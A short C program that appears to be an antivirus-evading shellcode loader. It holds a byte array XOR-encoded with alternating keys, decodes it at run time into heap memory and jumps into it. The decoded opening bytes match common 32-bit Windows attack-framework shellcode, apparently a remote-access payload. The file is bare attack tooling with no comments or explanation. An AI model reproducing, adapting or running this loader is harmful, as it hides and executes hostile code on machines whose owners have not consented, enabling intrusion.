#include <stdio.h>
#include <stdlib.h>

unsigned char buf[] = 
"\x56\xbd\x28\x55\xaa\x55\xca\xdc\x4f\x64\x6a\x31\x21\x05\x9a\xde"
"\xf8\x59\x21\x07\xbe\xde\xd8\x7d\xa5\xe2\xe0\x73\x9b\xaa\x06\x69"
"\xcb\x29\xa8\x79\x8a\x94\x65\x58\xab\x92\x48\xa7\xf8\x02\x21\x07"
"\xba\xde\xe0\x69\x21\x19\xbb\x2d\x49\x1d\xab\x84\xfb\xde\xf3\x75"
"\xab\x86\x21\x1c\xb2\xb6\x90\x1c\x21\x61\x21\x54\x7c\x64\x55\xf9"
"\x6b\x9a\xa7\x54\x6d\x6d\x4a\x20\x5c\x56\xd7\xad\x91\x28\x8e\x20"
"\x4e\x0d\x21\x0d\x8e\x54\x79\x33\x21\x59\xe1\xde\xf2\x49\xab\x86"
"\x21\x51\x21\x54\x7a\xdc\xee\x71\x8e\x0e\xf1\x34\xf3\x0f\xfb\xaa"
"\x4a\x0a\xf5\x0f\x21\x47\x41\xd8\xf7\x3d\x99\x67\xaa\x55\xc2\x22"
"\xd9\x67\xf5\x01\xc2\x19\xdd\x73\xad\xaa\x7f\xed\x3a\x54\xaa\x55"
"\x83\x91\xfe\x05\xc2\x7c\x2a\x3e\xaa\xaa\x7f\x3f\xaf\x3d\xaa\x55"
"\xaa\x55\xc2\x57\xaa\x44\xf6\xdc\x4c\x05\xfa\x05\xfa\x15\xfa\x15"
"\xfa\x3d\x40\x5a\x75\xb5\x55\x80\x3d\x3f\xba\x03\xfd\x3d\x33\xf0"
"\xde\x34\x55\x80\x2f\x95\xde\x5f\x55\x1b\xa2\x20\x46\xbd\xcb\x55"
"\xaa\x55\xc0\x55\xc0\x51\xfc\x02\xc2\x57\x73\x9d\xf5\xaa\x7f\xd6"
"\x52\x55\xd4\x63\x21\x63\xc0\x15\xc2\x55\xba\x55\xaa\x03\xc0\x55"
"\xc2\x0d\x0e\x06\x4f\xaa\x7f\xc6\xf9\x3f\xaa\x03\xf9\x02\xc2\x57"
"\x73\x9d\xf5\xaa\x7f\xd6\x52\x55\xd7\x77\xf2\x3d\xaa\x15\xaa\x55"
"\xc0\x55\xfa\x3d\xa1\x7a\xa5\x65\x55\x80\xfd\x3d\xdf\x3b\xe7\x34"
"\x55\x80\xf4\x0b\x55\x59\x8e\xbc\xdb\xaa\x55\xaa\xab\x96\x83\x93"
"\xdf\x92\x69\xee\x5a\xe0\x08\x03\xc0\x55\xf9\xaa\x7f";

int main()
{
    int i;
    void (*func)(void);
    char *p;
    p = (char *)malloc(sizeof(buf));

    for(i = 0; i < (sizeof(buf) - 1); i++) {
        if (i % 2 == 0) {
            p[i] = buf[i] ^ 0xaa;
        } else {
            p[i] = buf[i] ^ 0x55;
        }
    }

    p[i] = '\0';
    func = (void (*)())p;
    func();
    return 0;
}